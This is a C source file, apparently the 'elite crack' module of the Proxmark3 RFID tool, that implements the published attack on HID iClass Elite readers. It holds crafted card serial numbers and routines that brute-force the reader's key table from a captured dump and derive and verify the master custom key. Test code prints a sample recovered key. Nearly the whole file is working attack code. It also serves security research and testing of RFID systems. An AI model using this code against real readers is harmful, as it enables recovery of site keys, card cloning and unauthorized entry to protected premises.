#include <stdint.h>
#include <stdbool.h>
#include <string.h>
#include <cipherutils.h>
#include <stdio.h>
#include <time.h>
#include "cipher.h"
#include "ikeys.h"
#include "elite_crack.h"
#include "fileutils.h"
#include "des.h"

iclass_attack attack_data[8] = {
	{ {0x00,0x0B,0x0F,0xFF,0xF7,0xFF,0x12,0xE0} , {0x01,0x01,0x00,0x00,0x45,0x01,0x45,0x45 } ,{0,1 }},
	{ {0x00,0x13,0x94,0x7e,0x76,0xff,0x12,0xe0} , {0x02,0x0c,0x01,0x00,0x45,0x01,0x45,0x45} , {2,12}},
	{ {0x2a,0x99,0xac,0x79,0xec,0xff,0x12,0xe0} , {0x07,0x45,0x0b,0x00,0x45,0x01,0x45,0x45} , {7,11}},
	{ {0x17,0x12,0x01,0xfd,0xf7,0xff,0x12,0xe0} , {0x03,0x0f,0x00,0x00,0x45,0x01,0x45,0x45} , {3,15}},
	{ {0xcd,0x56,0x01,0x7c,0x6f,0xff,0x12,0xe0} , {0x04,0x00,0x08,0x00,0x45,0x01,0x45,0x45} , {4,8}},
	{ {0x4b,0x5e,0x0b,0x72,0xef,0xff,0x12,0xe0} , {0x0e,0x06,0x08,0x00,0x45,0x01,0x45,0x45} , {6,14}},
	{ {0x00,0x73,0xd8,0x75,0x58,0xff,0x12,0xe0} , {0x0b,0x09,0x0f,0x00,0x45,0x01,0x05,0x45} , {9,5}},
	{ {0x0c,0x90,0x32,0xf3,0x5d,0xff,0x12,0xe0} , {0x0d,0x0f,0x0a,0x00,0x45,0x01,0x05,0x45} , {10,13}},
};


/**
 * @brief Permutes a key from standard NIST format to Iclass specific format
 *	from http://www.proxmark.org/forum/viewtopic.php?pid=11220#p11220
 *
 *	If you permute [6c 8d 44 f9 2a 2d 01 bf]  you get  [8a 0d b9 88 bb a7 90 ea]  as shown below.
 *
 * 	1 0 1 1 1 1 1 1  bf
 *	0 0 0 0 0 0 0 1  01
 *	0 0 1 0 1 1 0 1  2d
 *	0 0 1 0 1 0 1 0  2a
 *	1 1 1 1 1 0 0 1  f9
 *	0 1 0 0 0 1 0 0  44
 *	1 0 0 0 1 1 0 1  8d
 *	0 1 1 0 1 1 0 0  6c
 *
 *	8 0 b 8 b a 9 e
 *	a d 9 8 b 7 0 a
 *
 * @param key
 * @param dest
 */
void permutekey(uint8_t key[8], uint8_t dest[8])
{

	int i;
	for(i = 0 ; i < 8 ; i++)
	{
		dest[i] =	(((key[7] & (0x80 >> i)) >> (7-i)) << 7) |
					(((key[6] & (0x80 >> i)) >> (7-i)) << 6) |
					(((key[5] & (0x80 >> i)) >> (7-i)) << 5) |
					(((key[4] & (0x80 >> i)) >> (7-i)) << 4) |
					(((key[3] & (0x80 >> i)) >> (7-i)) << 3) |
					(((key[2] & (0x80 >> i)) >> (7-i)) << 2) |
					(((key[1] & (0x80 >> i)) >> (7-i)) << 1) |
					(((key[0] & (0x80 >> i)) >> (7-i)) << 0);
	}

	return;
}
/**
 * Permutes  a key from iclass specific format to NIST format
 * @brief permutekey_rev
 * @param key
 * @param dest
 */
void permutekey_rev(uint8_t key[8], uint8_t dest[8])
{
	int i;
	for(i = 0 ; i < 8 ; i++)
	{
		dest[7-i] =	(((key[0] & (0x80 >> i)) >> (7-i)) << 7) |
					(((key[1] & (0x80 >> i)) >> (7-i)) << 6) |
					(((key[2] & (0x80 >> i)) >> (7-i)) << 5) |
					(((key[3] & (0x80 >> i)) >> (7-i)) << 4) |
					(((key[4] & (0x80 >> i)) >> (7-i)) << 3) |
					(((key[5] & (0x80 >> i)) >> (7-i)) << 2) |
					(((key[6] & (0x80 >> i)) >> (7-i)) << 1) |
					(((key[7] & (0x80 >> i)) >> (7-i)) << 0);
	}
}
/**
 * @brief Reads data from the iclass-reader-attack dump file.
 * @param dump, data from a iclass reader attack dump.  The format of the dumpdata is expected to be as follows:
		<8 byte CSN><4 byte NR><4 byte MAC>
		.. 126 times...
 * @param cc_nr an array to store cc_nr into (12 bytes)
 * @param csn an arracy ot store CSN into (8 bytes)
 * @param received_mac an array to store MAC into (4 bytes)
 * @param i the number to read. Should be less than 127, or something is wrong...
 * @return
 */
int _readFromDump(uint8_t dump[], uint8_t cc_nr[], uint8_t csn[], uint8_t received_mac[], uint8_t i)
{
	if(i  > 8){
		PrintAndLog("Error, only eight malicious CSNs used here");
		return 1;
	}

	memcpy(csn, dump+i*16, 8);
	memset(cc_nr, 0,12);
	// Load NR (cc is eight zeroes)
	cc_nr[8] = *(dump+i*16+8);
	cc_nr[9] = *(dump+i*16+8+1);
	cc_nr[10] = *(dump+i*16+8+2);
	cc_nr[11] =	*(dump+i*16+8+3);

	// Load MAC
	memcpy(received_mac, dump+i*16+12, 4);

	if(memcmp(attack_data[i].simulated_csn, csn, 8) != 0)
	{
		PrintAndLog("Something is wrong:");
		printvar("Expected CSN",attack_data[i].simulated_csn,8);
		printvar("Found CSN   ",csn,8);
		return 1;
	}

	if(true)
	{
		printvar("csn", csn,8);
		printvar("cc_nr", cc_nr,12);
		printvar("mac", received_mac,4);
	}

	return 0;
}

int _bruteforceThreeBytes(	uint8_t cc_nr[],uint8_t csn[], uint8_t received_mac[4], uint8_t keytable[]);
/**
 * @brief Bruteforce calculation of the first three bytes (actually, bytes 0x00, 0x01 and 0x45)
 * This method performs up to 2^28 tests to find the three bytes in in the keytable.
 *
 * This method assumes that the CSN used was  '000B0FFFF7FF12E0'
 *- since this CSN gives the HASH value of 0101000045014545, thus solely depending on three bytes
 *from the 128-byte keytable. The CC used is expected to be {0,0,0,0,0,0,0,0}
 * @param dump, data from a iclass reader attack dump.  The format of the dumpdata is expected to be as follows:
		<8 byte CSN><4 byte NR><4 byte MAC>
		.. 126 times...

 * @param keytable, where to write the found values. Should be 128 byte array of uint8's.
 */
int bruteforceThreeBytes(uint8_t dump[], uint8_t keytable[])
{

	// Some required storeage
	// CSN - card csn
	uint8_t csn[8] = { 0 };
	// CC and NR : Card challenge (all zeroes: 8 Bytes) and Reader Nonce (4 Bytes)
	uint8_t cc_nr [12] = {0};
	// The obtained MAC code
	uint8_t received_mac[4] = {0};
	// Load data from dump
	_readFromDump(dump, cc_nr, csn, received_mac,0);
	return _bruteforceThreeBytes(cc_nr, csn, received_mac, keytable );

}
int _bruteforceThreeBytes(	uint8_t cc_nr[],uint8_t csn[], uint8_t received_mac[4], uint8_t keytable[])
{

	// CSN				HASH1 (CSN)
	//000B0FFFF7FF12E0	0101000045014545
	//hash1 =  01 01 00 00 45 01 45 45

	// Selected key, the key which is up for testing
	uint8_t key_sel[8] = {0};
	// Iclass-permuted version of the key
	uint8_t key_sel_p[8] = { 0 };
	// Diversified key
	uint8_t div_key[8] = {0};
	// Where to store calculated MAC.
	uint8_t calculated_MAC[4] = { 0 };

	uint8_t b0 = 0, b1 =0 ,b45 =0;
	b0=0x00;
	//b0=241;
	//b0=0xdf;
	int dbg = 0;
	/**
	  Debug run:

	key_sel = fefe000000fe0000
	key_sel_p = 00c4c4c4c4c4c4c4
	kd = c9c7ee6e7d54e5a0
	cc_nr = 0000000000000000a97dded0
	mac = 6f22b5ab

	**/
	PrintAndLog("Performing up to 2^24 MAC calculations, may take a few minutes...");

	do {
		b1=00;
		do {
			b45=0;
			do {
				//key_sel = {b1,b1,b0,b0,b45,b1,b45,b45};
				key_sel[0] = b1;
				key_sel[1] = b1;
				key_sel[2] = b0;
				key_sel[3] = b0;
				key_sel[4] = b45;
				key_sel[5] = b1;
				key_sel[6] = b45;
				key_sel[7] = b45;
				//the key_sel is now on iclass-format
				// We need it on standard format, so reverse permute:
				permutekey_rev(key_sel,key_sel_p);

				diversifyKey(csn, key_sel_p, div_key);

				doMAC(cc_nr, div_key,calculated_MAC);
				if(dbg)
				{
					printvar("key_sel", key_sel,8);
					printvar("key_sel_p", key_sel_p,8);
					printvar("kd", div_key,8);
					printvar("cc_nr", cc_nr,12);
					printvar("mac", calculated_MAC,4);
				}
				if(memcmp(calculated_MAC, received_mac, 4) == 0)
				{
					keytable[0x0] = b0;
					keytable[0x1] = b1;
					keytable[0x45] = b45;
					PrintAndLog("Found! 0x00,0x01,0x45 = [0x%02x,0x%02x,0x%02x]", b0,b1,b45);
					return 0;
				}

			} while (b45++ != 255);
		} while (b1++ != 255);
		printf("%d ", b0);
		fflush(stdout);
	} while (b0++ != 255);

	return 1;
}
/**
 * @brief Performs brute force attack against the remaining 14 bytes after the initial 2^24-attack has
 * recovered three bytes already. This attack runs considerably faster; 7 * 256*256 (max) diversify+MAC
 * calculations.
 * @param dump The dumpdata from iclass reader attack.
 * @param keytable where to write found values.
 * @return
 */
int bruteforceTwobytes(uint8_t dump[], uint8_t keytable[])
{
	int errors = 0;
	uint8_t i;
	uint8_t csn[8] = { 0 };
	uint8_t *key_index;
	uint8_t key_sel_p[8] = { 0 };
	uint8_t div_key[8] = {0};
	int found = false;
	uint8_t cc_nr [12] = {0};
	uint8_t received_mac[4] = {0};
	uint8_t key_sel[8] = {0};
	uint8_t calculated_MAC[4] = { 0 };
	int x,y;
	// We start at index 1!! At zero is the three-byte attack
	for(i =1 ; i < 8; i++)
	{
		_readFromDump(dump, cc_nr, csn, received_mac, i);

		key_index = attack_data[i].key_indices;
		x=0;
		do {
			//Set the byte 1 to recover to x
			keytable[attack_data[i].recovered_keybytes[0]] = x;
			y=0;
			do {
				//Set the byte 2 to recover to y
				keytable[attack_data[i].recovered_keybytes[1]] = y;
				// Piece together the key
				key_sel[0] = keytable[key_index[0]];key_sel[1] = keytable[key_index[1]];
				key_sel[2] = keytable[key_index[2]];key_sel[3] = keytable[key_index[3]];
				key_sel[4] = keytable[key_index[4]];key_sel[5] = keytable[key_index[5]];
				key_sel[6] = keytable[key_index[6]];key_sel[7] = keytable[key_index[7]];

				//Permute from iclass format to standard format
				permutekey_rev(key_sel,key_sel_p);
				//Diversify
				diversifyKey(csn, key_sel_p, div_key);
				//Calc mac
				doMAC(cc_nr, div_key,calculated_MAC);
				if(memcmp(calculated_MAC, received_mac, 4) == 0)
				{

					PrintAndLog("[0x%02x:0x%02x][0x%02x:0x%02x]"
								,attack_data[i].recovered_keybytes[0],x
								,attack_data[i].recovered_keybytes[1],y);
					found = true;
					break;
				}

			}while(y++ != 255 && found == 0);
		}while(x++ != 255 && found==0);

		if(! found)
		{
			PrintAndLog("Failed to recover bytes 0x%02x and 0x%02x"
						,attack_data[i].recovered_keybytes[0]
						,attack_data[i].recovered_keybytes[1]);
			errors++;
		}
		found = false;
	}
	return errors;
}


/**
 * From dismantling iclass-paper:
 *	Assume that an adversary somehow learns the first 16 bytes of hash2(K_cus ), i.e., y [0] and z [0] .
 *	Then he can simply recover the master custom key K_cus by computing
 *	K_cus = ~DES(z[0] , y[0] ) .
 *
 *	Furthermore, the adversary is able to verify that he has the correct K cus by
 *	checking whether z [0] = DES enc (K_cus , ~K_cus ).
 * @param keytable an array (128 bytes) of hash2(kcus)
 * @param master_key where to put the master key
 * @return 0 for ok, 1 for failz
 */
int calculateMasterKey(uint8_t keytable[], uint64_t master_key[] )
{
	des_context ctx_e = {DES_ENCRYPT,{0}};

	uint8_t z_0[8] = {0};
	uint8_t y_0[8] = {0};
	uint8_t z_0_rev[8] = {0};
	uint8_t key64[8] = {0};
	uint8_t key64_negated[8] = {0};
	uint8_t result[8] = {0};

	// y_0 and z_0 are the first 16 bytes of the keytable
	memcpy(y_0,keytable,8);
	memcpy(z_0,keytable+8,8);

	// Our DES-implementation uses the standard NIST
	// format for keys, thus must translate from iclass
	// format to NIST-format
	permutekey_rev(z_0, z_0_rev);

	// ~K_cus = DESenc(z[0], y[0])
	des_setkey_enc( &ctx_e, z_0_rev );
	des_crypt_ecb(&ctx_e, y_0, key64_negated);

	int i;
	for(i = 0; i < 8 ; i++)
	{
		key64[i] = ~key64_negated[i];
	}

	// Can we verify that the  key is correct?
	// Once again, key is on iclass-format
	uint8_t key64_stdformat[8] = {0};
	permutekey_rev(key64, key64_stdformat);

	des_setkey_enc( &ctx_e, key64_stdformat );
	des_crypt_ecb(&ctx_e, key64_negated, result);
	PrintAndLog("\nHigh security custom key (Kcus):");
	printvar("Std format   ", key64_stdformat,8);
	printvar("Iclass format", key64,8);

	if(master_key != NULL)
		memcpy(master_key, key64, 8);

	if(memcmp(z_0,result,4) != 0)
	{
		PrintAndLog("Failed to verify calculated master key (k_cus)! Something is wrong.");
		return 1;
	}else{
		PrintAndLog("Key verified ok!\n");
	}
	return 0;
}

int verifyAndReorder(uint8_t dump[])
{
	uint8_t newdump[8*16];
	uint8_t csn[8] = {0};
	uint8_t cc_nr[8] = {0};
	uint8_t received_mac[8] = {0};
	int error = 0;
	int was_ok = 1;
	uint8_t i;
	for(i = 0; i < 8; i++)
	{
		iclass_attack attack = attack_data[i];
		if(_readFromDump(dump, cc_nr, csn, received_mac, i))
		{
			int j;
			int found = 0;
			//Wrong order, search for it
			for(j =0 ; j < 8; j++)
			{
				if(memcmp(attack.simulated_csn, dump+j*16,8)== 0)
				{// Found it
					memcpy(newdump+i*16, dump+j*16,16);
					PrintAndLog("Reordered CSN");
					printvar("CSN", attack.simulated_csn,8);
					found = 1;
					was_ok = 0;
					break;
				}
			}
			if(!found)
			{
				PrintAndLog("Missing attack-CSN!");
				printvar("CSN",attack.simulated_csn,8);
				error += 1;
			}
		}else
		{
			memcpy(newdump+i*16, dump+i*16,16);
		}
	}
	if(!was_ok)
	{
		saveFile("iclass_dump_reordered","bin",newdump,sizeof(newdump));
	}
	memcpy(dump, newdump,sizeof(newdump));
	return error;
}

/**
 * Perform a bruteforce against a file which has been saved by pm3 "hf iclass sim 2" - command,
 * using the 'optimal' 8-CSN approach.
 * @brief bruteforceFile
 * @param filename
 * @param verify
 * @return
 */
int bruteforceFile(const char *filename, int verify)
{
	int errors = 0;
	uint8_t keytable[128] = {0};
	uint8_t dump[8*16] = {0};
	if( loadFile(filename, dump, sizeof(dump)))
	{
		PrintAndLog("Failed to load dump-file (%s)" , filename);
		return 1;
	}
	PrintAndLog("[+] Loaded dump file %s", filename);
	if(verify)
		verifyAndReorder(dump);

	clock_t t1 = clock();
	errors += bruteforceThreeBytes(dump,keytable);
	errors += bruteforceTwobytes(dump, keytable);
	clock_t t2 = clock();
	float diff = (((float)t2 - (float)t1) / CLOCKS_PER_SEC );
	PrintAndLog("\nPerformed full crack in %f seconds",diff);
	printarr_human_readable("High Security Key Table (a.k.a Hash2)", keytable, 128);

	errors += calculateMasterKey(keytable, NULL);

	return errors;
}
/**
 * Perform a bruteforce against a file which uses the proxclone.com-variant with 126 CSNs,
 * @brief bruteforceFile
 * @param filename
 * @param verify
 * @return
 */

int bruteforceFile_proxclone_format(const char *filename, int verify)
{
	int errors = 0;
	uint8_t keytable[128] = {0};
	uint8_t dump[126*(16)] = {0};
	if( loadFile(filename, dump, sizeof(dump)))
	{
		PrintAndLog("Failed to load dump-file (%s)" , filename);
		return 1;
	}
	PrintAndLog("[+] Loaded dump file %s", filename);

	clock_t t1 = clock();
	errors += bruteforceThreeBytes(dump,keytable);
	errors += bruteforceTwobytes(dump, keytable);
	clock_t t2 = clock();
	float diff = (((float)t2 - (float)t1) / CLOCKS_PER_SEC );
	PrintAndLog("\nPerformed full crack in %f seconds",diff);

	errors += calculateMasterKey(keytable, NULL);

	return errors;
}

// ---------------------------------------------------------------------------------
// ALL CODE BELOW THIS LINE IS PURELY TESTING
// ---------------------------------------------------------------------------------
// ----------------------------------------------------------------------------
// TEST CODE BELOW
// ----------------------------------------------------------------------------

int _testBruteforce()
{
	int errors = 0;
	// First test
	PrintAndLog("[+] Testing three-byte crack from known values...");
	if(true){
		clock_t t1 = clock();
		uint8_t cc_nr[] = {0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xa9,0x7d,0xde,0xd0};
		uint8_t csn[8] = { 0x00,0x0b,0x0f,0xff,0xf7,0xff,0x12,0xe0 };
		uint8_t received_mac[] = {0xdd,0x98,0xae,0x0e};
		uint8_t keytable[128] = {0};
		_bruteforceThreeBytes(cc_nr, csn, received_mac,keytable);
		clock_t t2 = clock();

		float diff = (((float)t2 - (float)t1) / CLOCKS_PER_SEC );
		PrintAndLog("\nPerformed three-byte crack in %f seconds",diff);

	}

	// First test
	PrintAndLog("[+] Testing crack from dumpfile...");
	{
		/**
		  Expected values for the dumpfile:
			High Security Key Table

			00  F1 35 59 A1 0D 5A 26 7F 18 60 0B 96 8A C0 25 C1
			10  BF A1 3B B0 FF 85 28 75 F2 1F C6 8F 0E 74 8F 21
			20  14 7A 55 16 C8 A9 7D B3 13 0C 5D C9 31 8D A9 B2
			30  A3 56 83 0F 55 7E DE 45 71 21 D2 6D C1 57 1C 9C
			40  78 2F 64 51 42 7B 64 30 FA 26 51 76 D3 E0 FB B6
			50  31 9F BF 2F 7E 4F 94 B4 BD 4F 75 91 E3 1B EB 42
			60  3F 88 6F B8 6C 2C 93 0D 69 2C D5 20 3C C1 61 95
			70  43 08 A0 2F FE B3 26 D7 98 0B 34 7B 47 70 A0 AB

			**** The 64-bit HS Custom Key Value = 5B7C62C491C11B39 ****
		**/
		uint8_t keytable[128] = {0};
		char * filename = "iclass_dump.bin";
		uint8_t dump[128*(8+4+4)] = {0};
		if( loadFile(filename, dump, sizeof(dump)))
		{
			PrintAndLog("Failed to load dump-file (%s)" , filename);
			return 1;
		}
		PrintAndLog("[+] Loaded dump file %s", filename);
		clock_t t1 = clock();
		bruteforceThreeBytes(dump,keytable);
		bruteforceTwobytes(dump, keytable);
		clock_t t2 = clock();
		float diff = (((float)t2 - (float)t1) / CLOCKS_PER_SEC );
		PrintAndLog("\nPerformed full crack in %f seconds",diff);
		printarr_human_readable("High Security Key Table (a.k.a Hash2)", keytable, 128);

		errors |= calculateMasterKey(keytable, NULL);

	}
	return errors;
}

int _test_iclass_key_permutation()
{
	uint8_t testcase[8] = {0x6c,0x8d,0x44,0xf9,0x2a,0x2d,0x01,0xbf};
	uint8_t testcase_output[8] = {0};
	uint8_t testcase_output_correct[8] = {0x8a,0x0d,0xb9,0x88,0xbb,0xa7,0x90,0xea};
	uint8_t testcase_output_rev[8] = {0};
	permutekey(testcase, testcase_output);
	permutekey_rev(testcase_output, testcase_output_rev);


	if(memcmp(testcase_output, testcase_output_correct,8) != 0)
	{
		PrintAndLog("Error with iclass key permute!");
		printarr("testcase_output", testcase_output, 8);
		printarr("testcase_output_correct", testcase_output_correct, 8);
		return 1;

	}
	if(memcmp(testcase, testcase_output_rev, 8) != 0)
	{
		PrintAndLog("Error with reverse iclass key permute");
		printarr("testcase", testcase, 8);
		printarr("testcase_output_rev", testcase_output_rev, 8);
		return 1;
	}

	PrintAndLog("[+] Iclass key permutation OK!");
	return 0;
}

int testElite()
{
	PrintAndLog("[+] Testing iClass Elite functinality...");
	PrintAndLog("[+] Testing key diversification ...");

	int errors = 0 ;
	errors +=_test_iclass_key_permutation();
	errors += _testBruteforce();
	return errors;

}

